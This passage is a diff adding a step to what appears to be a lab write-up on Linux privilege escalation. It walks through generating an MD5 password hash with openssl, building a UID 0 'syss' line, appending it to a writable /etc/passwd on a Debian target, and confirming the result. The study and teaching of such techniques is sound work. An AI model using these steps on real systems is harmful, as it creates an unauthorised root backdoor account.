@@ -200,3 +200,72 @@ root:x:0:0:root:/root:/bin/bash
 | /root       | /root       | Home directory                                         |
 | /bin/bash   | /bin/bash   | Shell                                                  |
 ```
+The `x` in the password field means the real password hash is stored in `/etc/shadow`. If I replace that `x` with a hash I generate myself, Linux will use my password instead of checking `/etc/shadow` — giving me root access with a password I control.
+
+<p align="center">
+  <img src="images/step2-1.png" width="600">
+</p>
+
+## Step 3 — Generating a Password Hash and Editing /etc/passwd
+
+### Generated a Password Hash on Kali
+
+```bash
+openssl passwd "password100"
+```
+**Output:**
+
+```
+$1$5EFEB5H4$Ze56xFFNd2t3zuCO2it..0
+```
+This is the MD5 password hash for the password `password100`
+
+### Built the New Root User Line
+
+I opened mousepad on Kali and built the new line by replacing `x` with the generated hash:
+
+```
+syss:$1$5EFEB5H4$Ze56xFFNd2t3zuCO2it..0:0:0:root:/root:/bin/bash
+```
+before:
+```
+root:x:0:0:root:/root:/bin/bash
+```
+```
+|              Field                 | Value                | Description                                    |
+|------------------------------------|----------------------|------------------------------------------------|
+| syss                               | syss                 | New username I am creating                     |
+| $1$5EFEB5H4$Ze56xFFNd2t3zuCO2it..0 | Hash of `password100`| My own password hash — Linux uses this directly|
+| 0                                  | 0                    | User ID 0 — root level access                  |
+| 0                                  | 0                    | Group ID 0 — root group                        |
+| root                               | root                 | Description                                    |
+| /root                              | /root                | Home directory                                 |
+| /bin/bash                          | /bin/bash            | Shell                                          |
+```
+### Opened /etc/passwd on the Target and Added the Line
+
+```bash
+user@debian:~$ nano /etc/passwd
+```
+I scrolled to the bottom of the file and pasted the line:
+
+```
+syss:$1$5EFEB5H4$Ze56xFFNd2t3zuCO2it..0:0:0:root:/root:/bin/bash
+```
+Then pressed Ctrl+X then Y then Enter to save and exit.
+
+### Confirmed the Line Was Added
+
+```bash
+user@debian:~$ cat /etc/passwd
+```
+**Output:**
+
+```
+root:x:0:0:root:/root:/bin/bash
+...
+Debian-exim:x:101:103::/var/spool/exim4:/bin/false
+syss:$1$5EFEB5H4$Ze56xFFNd2t3zuCO2it..0:0:0:root:/root:/bin/bash
+...
+mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false
+```
